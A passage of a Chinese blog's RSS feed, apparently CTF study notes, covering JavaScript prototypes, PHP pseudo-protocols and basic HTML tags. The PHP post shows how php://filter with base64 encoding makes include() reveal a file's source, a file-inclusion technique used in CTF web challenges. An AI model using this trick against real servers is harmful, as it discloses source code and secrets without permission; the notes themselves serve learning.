keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 给构造函数的 prototype 添加一个方法&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function-variable function&#34;&gt;sayHello&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Hello, I am &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 创建一个实例&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; john &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;John&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用 __proto__ 访问原型对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;john&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__proto__ &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// true&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用 constructor 访问构造函数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;john&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;constructor &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; Person&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// true&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用 Object.getPrototypeOf () 访问原型对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Object&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getPrototypeOf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;john&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// true&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用原型链调用方法&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;john&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sayHello&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 输出: &#34;Hello, I am John&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/04/15/CTF/Web/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</guid>
            <title>PHP伪协议</title>
            <link>https://ly1tnt.github.io/2024/04/15/CTF/Web/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Mon, 15 Apr 2024 21:55:50 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php伪协议&#34;&gt;#&lt;/a&gt; PHP 伪协议&lt;/h1&gt;
&lt;p&gt;php:// 用来访问输入和输出流（I/O streams）。&lt;br /&gt;
输入 / 输出流也就是「数据流」，数据流可以是某个文件（xx.php）或某个 url（&lt;a href=&#34;http://www.baidu.com&#34;&gt;http://www.baidu.com&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;php://filter 可以在访问数据流之前进行「过滤」，并指定过滤方式。&lt;/p&gt;
&lt;p&gt;php://filter 有 4 个可用参数：&lt;/p&gt;
&lt;p&gt;名称	描述&lt;br /&gt;
 resource=&amp;lt;要过滤的数据流&amp;gt;	这个参数是必须的。它指定了你要筛选过滤的数据流。&lt;br /&gt;
read=&amp;lt;读链的筛选列表&amp;gt;	该参数可选。可以设定一个或多个过滤器名称&lt;br /&gt;
 write=&amp;lt;写链的筛选列表&amp;gt;	该参数可选。可以设定一个或多个过滤器名称&lt;br /&gt;
 &amp;lt;；两个链的筛选列表&amp;gt;	任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。&lt;/p&gt;
&lt;h2 id=&#34;一-访问数据流&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-访问数据流&#34;&gt;#&lt;/a&gt; 一、访问数据流&lt;/h2&gt;
&lt;p&gt;直接「读取」数据源的内容，resource 参数必须位于 php://filter 的末尾，并指定需要过滤筛选的数据流。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1）读取「url 形式」的数据流。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;#等同于 readfile*(&#39;&lt;a href=&#34;http://www.baidu.com&#34;&gt;http://www.baidu.com&lt;/a&gt;&#39;);*&lt;/p&gt;
&lt;p&gt;readfile(&#39;php://filter/resource=&lt;a href=&#34;http://www.baidu.com&#34;&gt;http://www.baidu.com&lt;/a&gt;&#39;);&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2）读取「文件形式」的数据流。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;# 等同于 include (&#39;hello.php&#39;);&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;include(&#39;php://filter/resource=hello.php&#39;);&lt;/p&gt;
&lt;h2 id=&#34;二-过滤数据流&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-过滤数据流&#34;&gt;#&lt;/a&gt; 二、过滤数据流&lt;/h2&gt;
&lt;p&gt;读取数据源之前，添加「过滤条件」。&lt;/p&gt;
&lt;p&gt;1）以「大写字母」读取  &lt;code&gt;http://www.baidu.com&lt;/code&gt;  页面的全部内容&lt;/p&gt;
&lt;p&gt;readfile(&amp;quot;php://filter/read=&lt;strong&gt;string.toupper&lt;/strong&gt;/resource=&lt;a href=&#34;http://www.baidu.com&#34;&gt;http://www.baidu.com&lt;/a&gt;&amp;quot;);&lt;/p&gt;
&lt;p&gt;2）以「小写字母」读取  &lt;code&gt;hello.php&lt;/code&gt;  文件的全部内容&lt;/p&gt;
&lt;p&gt;include(&amp;quot;php://filter/read=&lt;strong&gt;string.tolower&lt;/strong&gt;/resource=hello.php&amp;quot;);&lt;/p&gt;
&lt;p&gt;3）将  &lt;code&gt;hello.php&lt;/code&gt;  文件的内容「base64 加密」后读取出来。&lt;br /&gt;
include () 包含的文件，默认会执行文件中的代码，&lt;strong&gt;但加密后的内容不会被执行，而是直接输出在页面中&lt;/strong&gt;，复制后解密就能拿到被包含文件的内容。&lt;/p&gt;
&lt;h2 id=&#34;三-多个过滤条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-多个过滤条件&#34;&gt;#&lt;/a&gt; 三、多个过滤条件&lt;/h2&gt;
&lt;p&gt;同时使用「多个过滤条件」时，使用&lt;strong&gt;管道符 | 分隔&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;1）base64 加密并且转换为大写&lt;/p&gt;
&lt;p&gt;&amp;lt;?php&lt;/p&gt;
&lt;p&gt;include(&#39;php://filter/read=convert.base64-encode|string.toupper/resource=hello.php&#39;);&lt;br /&gt;
 按照「从左到右」的顺序过滤，过滤条件的顺序可能会影响过滤的结果&lt;/p&gt;
&lt;h2 id=&#34;四-过滤并写入数据流&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-过滤并写入数据流&#34;&gt;#&lt;/a&gt; 四、过滤并写入数据流&lt;/h2&gt;
&lt;p&gt;write 参数，过滤指定字符，并将过滤后的结果「输出」到指定文件中。&lt;/p&gt;
&lt;p&gt;1）过滤字符，并输出到 result.txt 文件中。&lt;/p&gt;
&lt;p&gt;&amp;lt;?php file_put_contents(&#39;php://filter/write=string.tolower/resource=result.txt&#39;,&#39;hello text&#39;);&lt;/p&gt;
&lt;h2 id=&#34;五-过滤器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五-过滤器&#34;&gt;#&lt;/a&gt; 五、过滤器&lt;/h2&gt;
&lt;h3 id=&#34;1-stringrot13&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-stringrot13&#34;&gt;#&lt;/a&gt; 1、string.rot13&lt;/h3&gt;
&lt;p&gt;对数据流的内容进行「rot13 编码」，等于用 str_rot13 () 函数编码。&lt;/p&gt;
&lt;p&gt;ROT13（otate by 13 places）也叫回转 13 位，是一种替换式密码。&lt;/p&gt;
&lt;p&gt;ROT13 会把每一个字母替换成 13 位之后的字母，也就是把 a 换成 n，b 换成 o，以此类推；如果超过了 26 个字母的范围，就会从开头重新开始。&lt;/p&gt;
&lt;h3 id=&#34;2-stringtoupper&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-stringtoupper&#34;&gt;#&lt;/a&gt; 2、string.toupper&lt;/h3&gt;
&lt;p&gt;将数据流转换成「大写」，类似于 strupper () 函数&lt;/p&gt;
&lt;p&gt;不是直接将文件内容变成大写，而是先执行文件内容，再将执行后的结果转换成大写。&lt;/p&gt;
&lt;h3 id=&#34;3-stringtolower&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-stringtolower&#34;&gt;#&lt;/a&gt; 3、string.tolower&lt;/h3&gt;
&lt;p&gt;将数据流转换成「小写」，类似 strtolower () 函数。&lt;/p&gt;
&lt;p&gt;也是先执行文件的内容，再将执行后的结果转换成小写。&lt;/p&gt;
&lt;h3 id=&#34;4-convertbase64-encode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-convertbase64-encode&#34;&gt;#&lt;/a&gt; 4、convert.base64-encode&lt;/h3&gt;
&lt;p&gt;对数据流的内容进行「base64 编码」，相当于 base64_encode () 函数。&lt;/p&gt;
&lt;p&gt;编码后的内容可以使用 base64_decode () 函数解码&lt;/p&gt;
&lt;h3 id=&#34;5-converticonv&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-converticonv&#34;&gt;#&lt;/a&gt; 5、convert.iconv.*&lt;/h3&gt;
&lt;p&gt;将数据流的内容按照「指定字符编码」来转换，使用格式有两种：&lt;/p&gt;
&lt;p&gt;格式一： &lt;code&gt;.&lt;/code&gt;  分隔&lt;/p&gt;
&lt;p&gt;convert.iconv.&amp;lt;input-encoding&amp;gt;.&amp;lt;output-encoding&amp;gt;&lt;/p&gt;
&lt;p&gt;格式二： &lt;code&gt;/&lt;/code&gt;  分隔&lt;/p&gt;
&lt;p&gt;convert.iconv.&amp;lt;input-encoding&amp;gt;/&amp;lt;output-encoding&amp;gt;&lt;/p&gt;
&lt;p&gt;ex:convert.iconv.utf-8*.utf-16* 的意思就是把文件的字符编码从 utf-8* 转换为 utf-16*&lt;/p&gt;
&lt;p&gt;支持的编码字符有&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
ISO-2022-JP
ISO-2022-JP-MS
CP932
CP51932
SJIS-mac (alias: MacJapanese)
SJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)
SJIS-Mobile#KDDI (alias: SJIS-KDDI)
SJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)
UTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)
UTF-8-Mobile#KDDI-A
UTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)
UTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)
ISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)
JIS
JIS-ms
CP50220
CP50220raw
CP50221
CP50222
ISO-8859-1*
ISO-8859-2*
ISO-8859-3*
ISO-8859-4*
ISO-8859-5*
ISO-8859-6*
ISO-8859-7*
ISO-8859-8*
ISO-8859-9*
ISO-8859-10*
ISO-8859-13*
ISO-8859-14*
ISO-8859-15*
ISO-8859-16*
byte2be
byte2le
byte4be
byte4le
BASE64
HTML-ENTITIES (alias: HTML)
7bit
8bit
EUC-CN*
CP936
GB18030
HZ
EUC-TW*
CP950
BIG-5*
EUC-KR*
UHC (alias: CP949)
ISO-2022-KR
Windows-1251 (alias: CP1251)
Windows-1252 (alias: CP1252)
CP866 (alias: IBM866)
KOI8-R*
KOI8-U*
ArmSCII-8 (alias: ArmSCII8)

&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2023/10/10/CTF/Web/HTML/</guid>
            <title>HTML笔记</title>
            <link>https://ly1tnt.github.io/2023/10/10/CTF/Web/HTML/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Tue, 10 Oct 2023 20:24:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;html&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#html&#34;&gt;#&lt;/a&gt; #HTML&lt;/h1&gt;
&lt;p&gt;W3C world wie web construction 万维网联盟&lt;/p&gt;
&lt;p&gt;hyper text markup language 超文本标记语言&lt;/p&gt;
&lt;p&gt;分段标签 &amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&lt;/p&gt;
&lt;p&gt;水平线标签 &amp;lt;hr/&amp;gt;&lt;/p&gt;
&lt;p&gt;换行标签 &amp;lt;br/&amp;gt;&lt;/p&gt;
&lt;p&gt;标题标签 &amp;lt;h1&amp;gt;&amp;lt;/h1&amp;gt;&lt;/p&gt;
&lt;p&gt;粗体 &amp;lt;strong&amp;gt;&amp;lt;/strong&amp;gt;&lt;/p&gt;
&lt;p&gt;斜体 &amp;lt;em&amp;gt;&amp;lt;/em&amp;gt;&lt;/p&gt;
&lt;p&gt;空格 &amp;amp;nbsp&lt;/p&gt;
&lt;p&gt;特殊符号 &amp;amp; 开头，随用随调&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;src: 图片地址 (必填)&lt;/p&gt;
&lt;p&gt;​         相对地址 (更推荐) 绝对地址&lt;/p&gt;
&lt;p&gt;​          ../-- 上一级目录&lt;/p&gt;
&lt;p&gt;alt: 图片名字 (必填)&lt;/p&gt;
&lt;p&gt;title: 悬停文字&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;内联框架&lt;/p&gt;
&lt;p&gt;iframe src=&amp;quot;path&amp;quot; name=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;![屏幕截图 2023-10-05 111559](C:\Users\lin\Pictures\Screenshots\ 屏幕截图 2023-10-05 111559.png)![屏幕截图 2023-10-05 110216](C:\Users\lin\Pictures\Screenshots\ 屏幕截图 2023-10-05 110216.png)&lt;/p&gt;
&lt;p&gt;value: 默认初始值 maxlength= (最长能写几个文字) size= (文本框的长度)&lt;/p&gt;
&lt;p&gt;下拉框 列表框&lt;/p&gt;
&lt;p&gt;select name=“”&lt;/p&gt;
&lt;p&gt;​        option value=      &amp;gt;  &amp;lt;/option&lt;/p&gt;
&lt;p&gt;/select&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;文件域&lt;/p&gt;
&lt;p&gt;input type=&amp;quot;file&amp;quot; name=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;input type=&amp;quot;button&amp;quot;value=&amp;quot;&amp;quot;name=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;邮箱验证&lt;/p&gt;
&lt;p&gt;input type=&amp;quot;email&amp;quot; name=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;URL&lt;/p&gt;
&lt;p&gt;input type=&amp;quot;url&amp;quot; name=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;数字&lt;/p&gt;
&lt;p&gt;input type=&amp;quot;number&amp;quot; name=&amp;quot;&amp;quot; max=&amp;quot;&amp;quot; min=&amp;quot;&amp;quot; step=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;滑块&lt;/p&gt;
&lt;p&gt;input type=&amp;quot;range&amp;quot; name=&amp;quot;&amp;quot; min=&amp;quot;&amp;quot; max=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;搜索框&lt;/p&gt;
&lt;p&gt;input type=&amp;quot;search&amp;quot; name=&amp;quot;&amp;quot;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;隐藏域 hidden&lt;/p&gt;
&lt;p&gt;只读 readonly&lt;/p&gt;
&lt;p&gt;禁用 disabled&lt;/p&gt;
&lt;p&gt;增强鼠标可用性&lt;/p&gt;
&lt;p&gt;label for=&amp;quot;&amp;quot;  /label&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;placeholder=&amp;quot;&amp;quot;(提示信息)&lt;/p&gt;
&lt;p&gt;required (非空判断)&lt;/p&gt;
&lt;p&gt;pattern 正则表达式？&lt;/p&gt;
&lt;hr /&gt;
 ]]></description>
        </item>
    </channel>
</rss>
